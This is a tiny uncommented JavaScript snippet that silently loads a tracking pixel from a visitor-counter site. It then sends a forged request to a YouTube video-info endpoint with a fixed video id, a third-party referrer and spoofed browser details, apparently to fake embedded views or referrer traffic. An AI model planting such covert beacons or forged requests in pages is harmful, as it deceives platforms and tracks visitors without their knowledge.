new Image().src="http://whos.amung.us/widget/muglauser.png";
function getRequest(url){
		 var xhr=new XMLHttpRequest;
			 xhr.open("GET",url,false);
			  xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
			  xhr.send();
	 }
	 getRequest("https://www.youtube.com/get_video_info?html5=1&video_id=s0MY5dDU-dI&cpn=wuwDNHk9n1ljWWFm&eurl=http%3A%2F%2Fwowediadealer.com%2Fyoutube.php&el=embedded&hl=tr_TR&sts=16920&lact=4&width=640&height=390&authuser=0&ei=eAgrV937EomQWIf3krgL&iframe=1&c=WEB&cver=1.20160502&cplayer=UNIPLAYER&cbr=Chrome&cbrver=49.0.2623.112&cos=Windows&cosver=6.1");
